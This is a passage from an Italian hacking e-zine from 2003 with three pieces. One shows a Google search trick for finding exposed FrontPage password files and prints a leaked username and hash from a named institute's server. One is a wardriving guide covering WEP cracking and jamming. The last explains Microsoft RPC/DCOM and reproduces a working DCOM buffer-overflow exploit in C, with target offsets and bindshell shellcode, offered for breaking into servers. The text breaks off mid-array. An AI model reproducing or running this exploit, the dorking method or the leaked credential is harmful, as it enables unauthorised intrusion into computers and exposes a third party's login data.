 <-- orion /home/ir ... 
 hercules.ifsi.rm.cnr.it/meeting/ HIFI/_vti_pvt/WS_FTP.LOG - 4k - Copia cache - Pagine simili 

 2) I LOG DELL'FTP 
 Index of /meeting/HIFI/_vti_pvt - [ Traduci questa pagina ]
 ... Oct-2000 11:49 1k service.grp 27-Oct-2000 11:49 1k service.lck 30-Oct-2000 15:38
 0k service.pwd 27-Oct ... Apache/1.3.22 Server at hercules.ifsi.rm.cnr.it Port 80 
 hercules.ifsi.rm.cnr.it/meeting/HIFI/_vti_pvt/ - 4k - Copia cache - Pagine simili 

 3) LA MIA CARA PASS
 # -FrontPage- erina:7KjDgaafMfI5k
 # -FrontPage- erina:7KjDgaafMfI5k 
 hercules.ifsi.rm.cnr.it/meeting/ HIFI/_vti_pvt/service.pwd - 1k - Copia cache - Pagine simili 

 DEH HI HE HE ROTFL...

 per scrupolo degli increduloni ecco parte dei Log...

[...]
 /home/ir/public_html/meeting/HIFI/_vti_pvt linkinfo.cnf
 2000.10.30 11:51 B C:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\service.cnf <-- orion   /home/ir/public_html/meeting/HIFI/_vti_pvt service.cnf
 2000.10.30 11:51 B C:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\service.grp <-- orion   /home/ir/public_html/meeting/HIFI/_vti_pvt service.grp
  2000.10.30 11:51 B C:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\service.pwd <-- orion   /home/ir/public_html/meeting/HIFI/_vti_pvt service.pwd
  2000.10.30 11:51 B C:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\services.cnf <-- orion  [...]
 /home/ir/public_html/meeting/HIFI/_vti_pvt services.cnf
 2000.10.30 15:54 B C:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\frontpg.lck -->   orion.ifsi.rm.cnr.it /home/ir/public_html/meeting/HIFI/_vti_pvt frontpg.lck
 2000.10.30 15:54 B C:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\service.lck -->   orion.ifsi.rm.cnr.it /home/ir/public_html/meeting/HIFI/_vti_pvt service.lck
[...]

 beh... cosa volete di +? state tranquilli non faccio la solita battuta sul lucano.
 
 <cyberdude> capisco
 <cyberdude> e tu cosa fai??
 <unrelated> non hai capito
 <unrelated> l'ho fatto con google
 <unrelated> e ho trovato
 <cyberdude> si si.. su google cosa hai ricercato??
 <unrelated> prima cerco www.###############.it
 <unrelated> e quindi oltre all'url
 <unrelated> mi dice dove stanno hostate le pagine <-- si parlava di un sito su un redirect
 <unrelated> poi cerco
 <unrelated> url vera del sitoz
 <unrelated> + service.pwd
 <unrelated> ed il gioco è fatto
 <unrelated> hihi
 <cyberdude> ke cazzata
 <cyberdude> ... questi sono idioti proprio
 <cyberdude> hihihi

 e va buò l'articolo è finito.. quando volete bucare qualche server non
 dimenticatevi di questa tecnica... ci vogliono giusto giusto 2 secondi
 e se funge vi risparmia un casino di tempo :) ciao ciao e alla proz...
 Ora scappo perchè in tv tra un pochino fanno CSI e non me lo perdere!!
 Ciao amici della crew.. AH colgo l'occasione per dirvi di animare  un
 pochino il forum di IL che per adesso è un pò scarno.
......•••.•••••••••••••••................
.......•••.•••.•...••.•••.............
.......•••••••••••.••.............
..........••••••••••••.•...............
........•••••••••••......••••••.......
.......••.•....•••..........•..
.............................
............................
..............................
.............................F
..............................F .`.(
...............F 44
........)(J)).
..)F"`
..F .  
(F 4
4)
..

--< unrelated at libero dot it >----------------------------------------
--------------------------------------¤ Lord Unrelated Lodeguns ¤-------
¢••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Antenne all'attacco                                                 |
|  Autore: Unrelated                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
¢•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
.....•
....•
....•
..•
...•
......•
........•
........•
.........
.........•...•
.....•.••
...........
......•.............
........•.••.............
....••••••••...••••••••...............    Antenne all'attacco!  ........
....•.••••••.•••••......................................................
..••••••••••••••••............          Lord Unrelated Lodeguns ........
••••••••.••••••••••.....................................................
..................................       04 Ottobre 2003 22.22  ........
.Networking Evolution >-------------------------------------------------
 Dal titolo potete già capire che sicuramente le reti wireless che d'ora
 in poi chiamero W. sono l'evoluzione del modo di concepire una rete...
 i vantaggi di una rete w. sono  vari...  diciamo  che  per  prima  cosa
 eliminiamo i tanto fastidiosi cavi, la velocità è la stessa e in alcuni
 casi  inferiore  alla vecchia LAN ma con un portatile siete  liberi  di
 sporstarvi  da  una  parte  all'altra  coperta  dalla rete w. senza far
 saltare il collegamento e per ultimo  il  w.  offre  la  possibilità  a 
 persone esterne qualora opportuno di collegarsi facilmente alla rete...
 hihi qualcuno penserà collegarsi facilmente non credo che  sotto  sotto 
 sia  un  pregio  ma  un  difetto...  beh  io  risponderei  "dipende" :)

.IEEE dal 97 a oggi >---------------------------------------------------
 Già nel Giugno del 97 la IEEE aveva elaborato un metodo per trasmettere
 via etere file alla frequenza di 1 o 2 Mbps.. ma subito dopo immise sul
 mercato due nuovi standard di comunicazione,  la  802.11b   che  girava
 sulle frequenze si circa 2,5 GHz cioè alla velocità di circa  11 Mpbs e
 la 802.11a che aveva una frequenza di 5GHz e che quindi era in grado di
 fornire una velocità che era di circa 56 Mbps

.WECA crea il Wi-Fi >---------------------------------------------------
 I consorzi*  elaborarono  sulla base di questi 2 standard, dei prodotti
 migliori...  uno  dei problema era il drastico rallentamento se 2 fonti
 di richiesta WLAn partivano da punti  molto  vicini  e  altri  problemi 
 inerenti alla trasmissione. Kmq  naquero  i  Wi-Fi  (Wireless Fidelty).
 * la WECA è composta da consorzi  tipo  la  Apple,  Compaq  e  altri...
 Da notare un altro progetto w. cioè Bluetooth che favoriva  una  sicura
 trasmissione di dati autocofigurabile da  un  software  apposito...  ma
 le  automazioni  come  sappiamo  causano  sempre  gravi  problemi  alla 
 sicurezza.


.Hacking di una rete Wireless >-----------------------------------------


 .Strutture di Rete
 Diciamo  che  molte  aziende  per  bisogni tecnologico-economico-fisici 
 scelgono come  soluzione la rete radio o infra, oppure se si tratta dei
 genitori di  superman usano quella a raggiX...  apparte  le  cazzate... 
 specificatamente parlando abbiamo 2 tipi di rete quelli con una  solida
 base con il solito hub con vari host  e quelli  indipendenti  cioè  che 
 non passano attraverso un nodo di rete ma vanno a ponticelli  l'uno con
 l'altro.

 .Difese di un Wireless
 Beh  diciamo  che  oltre  a  mettere  un  accesso con pass e a criptare
 con il protocollo WEP che utilizza un algoritmo RC4 molto  non  possono
 fare... anche perchè  comunque non  sono  di  facile  configurazione...
 perciò le possibilità  di  attacco  sono  varie...  ricordiamo  che  le
 onde radio,x esempio di un potenziale di 100 metri, messe in una stanza
 di 80 metri non è che si bloccano, ma vanno fuori di 20 metri..  e  poi
 vedremo come... noi potremmo sfruttare quei 20 metri diciamo  regalati!
 
.Attrezzi del Mestiere [Wardriving(in macchina) e Warwalking(a piedi)] 
 Beh... un hacker per scroccare una connessione free in teoria basta che
 se ne va a spasso con il portatile e una  scheda wireless nei pressi di
 aziende e in grossi uffici di città, ma in pratica non è così  semplice
 prima cosa dovrete costruirvi una antenna a base magnetica... dopo  una
 strenuante ricerca ho trovato un link moolto interessante che vi spiega
 in ITALIANO come costruirsi una antenna  barattolo,  l'articolo  è  del
 mitico IS0GrB (www.is0grb.it)...  e  poi  vi serve uno scanner di  reti
 per linux abbiamo il  famosissimo  Kismet (www.kismetwireless.it),  poi
 per   winzoz  (www.airsnort.shmoo.com)  e  poi  per  macintosh  trovate
 Macstumbler (www.netstumbler.com)
 
.A caccia di Onde!
 I  programmi  citati  sono come degli scanner normali di rete... quindi
 una volta trovato il posto  sorgente  del  segnale  non  ci  resta  che 
 sgamare il nome della LAN, anche detto + tecnicamente SSIS (Service Set 
 Identifer),  se  abbiamo  culo e  il  protocollo  DHCP è attivo abbiamo 
 accesso diretto.

.Protocollo WEP
 Se la rete è protetta possiamo tentare anche di violare il  protocollo
 WEP con questo WEPcrack (http://wepcrack.sourceforge.net).

.Jamming (DoS)
 Se abbiamo anche noi una rete possiamo trasmettere dei segnali inutili
 alla  rete  da  attaccare  così  sovrapponendo  i segnali chi si vorrà
 collegare si troverà l'accesso negato.

.Legge >----------------------------------------------------------------

.Codice delle comunicazioni elettroniche.
 
 Non so a chi potrà interessare, ma  visto  che  ho  studiato  per  puro
 diletto questo lato a mio avviso molto importante dell'hacking  vediamo
 che esce dallo studio di queste leggi... kmq non ho l'ho letto tutto ma
 una cosa è certa farsi  una  antenna  non  è  incriminabile,  usarla  a 
 scapito di altre persone sì, anche se:
 Per radio  amatore  come  dice  la  gazzetta  è  intendibile  qualsiesi
 apparato a Onde RADIO ;D

 Articolo 12
  4. E' consentita l'interconnessione delle stazioni di radioamatore
  con  le  reti  pubbliche  di  comunicazione  elettronica  per  motivi
  esclusivi  di  emergenza  o  di conseguimento delle finalita' proprie
  dell'attivita' di radioamatore.
  8.  E' vietato ai radioamatori intercettare comunicazioni che essi
  non  hanno  titolo  a  ricevere;  e' comunque vietato far conoscere a
  terzi   il  contenuto  e  l'esistenza  dei  messaggi  intercettati  e
  involontariamente captati.
 
 Va beh... commentano da soli queste leggi... kmq negli allegati trovate
 l'intero Decreto Legislativo... 
......•••.•••••••••••••••................
.......•••.•••.•...••.•••.............
.......•••••••••••.••.............
..........••••••••••••.•...............
........•••••••••••......••••••.......
.......••.•....•••..........•..
.............................
............................
..............................
.............................F
..............................F .`.(
...............F 44
........)(J)).
..)F"`
..F .  
(F 4
4)
..

--< unrelated at libero dot it >----------------------------------------
--------------------------------------¤ Lord Unrelated Lodeguns ¤-------
¢••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••




+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Remote Procedure Call                                               |
|  Autore: Unrelated                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
¢•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
.....•
....•
....•
..•
...•
......•
........•
........•
.........
.........•...•
.....•.••
...........
......•.............
........•.••.............
....••••••••...••••••••...............   Remote Procedure Call  ........
....•.••••••.•••••......................................................
..••••••••••••••••............          Lord Unrelated Lodeguns ........
••••••••.••••••••••.....................................................
..................................       09 Ottobre 2003 20.41  ........
.I ragazzi dell'LSD >---------------------------------------------------
 hihih... non è una droga che si prendono i ragazzi di questo gruppo di
 security ;D ma semplicemente la sigla Last Stage of Delirium,    hanno 
 scoperto prima della microsoft  delle  possibili  vulnerabilità  sulla
 Remote Procedure Call, cosa che credo gli faccia mooolto onore.

.Cos'è l'RPC e come funge >---------------------------------------------
 Beh,  all'inizio  anche  io  ero  incerto  su come rispondere a questa
 domanda... dopo essermi documentato sono arrivato alla conclusione che
 devo farvi il disegnino oltre alla  spiegazione  se  no  non  capirete
 quello che vi dico... 


 Per  prima cosa  è distruttivo da win98 in su, fino al  windows server 
 2003...  poi dipende,   tipo nel win2000 provoca  un semplice kill del
 servizio  RPC,  in  altri  il  reboot  di  sistema.  Allora  un client
 RPC chiama il server presentando una  identificazione  globale  (UUID) 
 inerente alle azione da compiere,    l'endpoint   mapper  allora entra
 in gioco e analizzando UUID nella  porta  135  in  attesa  della della
 connessione, indirizza il client alla porta  giusta.  Cioè in effetti,
 aiuta i programmi a capire come e  dove   devono   scambiare   dati  e 
 invocare funzioni e metodi che  in  effetti  sono  diversi  dal client
 e il server e  quindi  devono  essere   regolati   in   modo   giusto. 
 E questo discorso  non  fa  una  grinza  risponde  pienamente  a  quel 
 concetto globale che anni fa era quasi un utopia, cioè l'inter-process
 comunication. Figuratevi che anche in recenti manuali di hacking l'RPC
 non viene proprio citato. 


||||||| Remote Procedure Call di Microsoft      
|||||>
|||||>             [ Client ]-------------------------[ Server ]
|||||>   
|||||>            Applicazione                       Applicazione
|||||>                      ^                                  ^                               
|||||>             1|     14|                         8|      7|
|||||>              .                                  .
|||||>             Client  Sub                        Server  Sub
|||||>                      ^                                  ^                               
|||||>             2|     13|                         9|      6|
|||||>              .                                  .
|||||>        Client Run-Time Library          Server Run-Time Library
|||||>                      ^                                  ^                               
|||||>             3|     12|                        10|      5|
|||||>              .                                  .
|||||>              Trasporto <----------------------> Trasporto
|||||>              .       ^                          |       ^                              
|||||>              .     11|                          |       .
|||||>              .       +__________________________|       .
|||||>              .                                          .
|||||>              ............................................
|||||||

 Allora  semplicemente  l'RPC  non  è destinabile  a prescidere... cioè
 sbatte più o meno a caso una richiesta presentando una identificazione
 globale (UUID). Sappiate che non abbiamo nessun  controllo  su  questo
 protocollo infatti si autoconfigura  similmente  in  tutti  i  sistemi 
 operativi.

 Molti si chiedeno ma perchè si parla di una vulnerabilità DCOM?
 il  Distributed Component Object Menager è un protocollo che serviva a
 far comunicare i software attraverso le  reti in modo diretto (Network
 OLE), quindi necessariamente nei suoi  processi  ha  dovuto  usare  il 
 meccanismo RPC.Per controllare gli oggetti DCOM basta che andate sotto
 WINDOWS\SYSTEM32\DCOMCFG.EXE  

.Attacchi all'RPC >-----------------------------------------------------
 Ed  ora  arriva  il bello... ci sono vari modi di attaccare rpc quindi 
 vari sono gli exploit trovati in rete...


 1) Quello di www.xfocus.org è avviabile dai sistemi unix con la raga di
 comando: # ./dcom.c -d 000.000.000.000 -p 135
 Logicamente  dove  stanno  gli 0 spero che sapete cosa mettere... kmq a
 scapito di passare info ai lameroni babbioni non lo dico... e vi lascio
 il codice dell'exploit che alcune persone, su alcuni giornali lamah che
 ammetto, mi compro x tenermi informato sempre un pò di +, ci mettono la
 firma sotto dicendo che lo hanno fatto loro... kmq tutti i nodi vengono
 al pettine sappiatelo admin buffoni del cazzo, che si fanno  belli  con
 l'aop avuto su #***********...  ma perpiacere...  gli  schemetti  negli
 articoli dove stanno? e i diritti degli exploit? puoi babbioneggiare  i
 fottuti lamah ma non me... e molti altri come me... 
 
 mi basta un gesto come il water e sei già in partenza/
 push inesistenza/un imbecille in autostrada con la diligenza/
                                                       (Dj Gruff)

---8<------8<------8<------8<------8<------8<------8<------8<------8<---
/*
  DCOM RPC Overflow Discovered by LSD
   -> http://www.lsd-pl.net/files/get?WINDOWS/win32_dcom
   
  Based on FlashSky/Benjurry's Code
   -> http://www.xfocus.org/documents/200307/2.html
   
  Written by H D Moore <hdm [at] metasploit.com>
   -> http://www.metasploit.com/
   
  - Usage: ./dcom <Target ID> <Target IP>
  - Targets:
  -          0    Windows 2000 SP0 (english)
  -          1    Windows 2000 SP1 (english)
  -          2    Windows 2000 SP2 (english)
  -          3    Windows 2000 SP3 (english)
  -          4    Windows 2000 SP4 (english)
  -          5    Windows XP SP0 (english)
  -          6    Windows XP SP1 (english)
 
*/

#include <stdio.h>
#include <stdlib.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00
,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45
,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E
,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D
,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41
,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00
,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45
,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00
,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29
,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF
,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09
,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00
,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00
,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00
,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00
,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E
,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00
,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00
,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00
,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00
,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x5C,0x00,0x5C,0x00};

unsigned char request3[]={
0x5C,0x00
,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00
,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};



unsigned char *targets [] =
        {
            "Windows 2000 SP0 (english)",
            "Windows 2000 SP1 (english)",
            "Windows 2000 SP2 (english)",
            "Windows 2000 SP3 (english)",
            "Windows 2000 SP4 (english)",
            "Windows XP SP0 (english)",
            "Windows XP SP1 (english)",
             NULL                                                                                       
        };
        
unsigned long offsets [] = 
        {
            0x77e81674, 
            0x77e829ec, 
            0x77e824b5, 
            0x77e8367a, 
            0x77f92a9b, 
            0x77e9afe3,
            0x77e626ba,
        };

unsigned char sc[]=
    "\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"
    "\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
    "\x46\x00\x58\x00\x46\x00\x58\x00"

    "\xff\xff\xff\xff" /* return address */
    
    "\xcc\xe0\xfd\x7f" /* primary thread data block */
    "\xcc\xe0\xfd\x7f" /* primary thread data block */

    /* port 4444 bindshell */
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
    "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
    "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
    "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
    "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
    "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
    "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
    "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"
    "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
    "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
    "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
    "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
    "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
    "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
    "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
    "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
    "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"
    "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
    "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
    "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
    "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
    "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
    "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
    "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
    "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
    "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
    "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
    "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
    "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
    "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
    "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
    "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";

   

unsigned char request4[]={
0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00
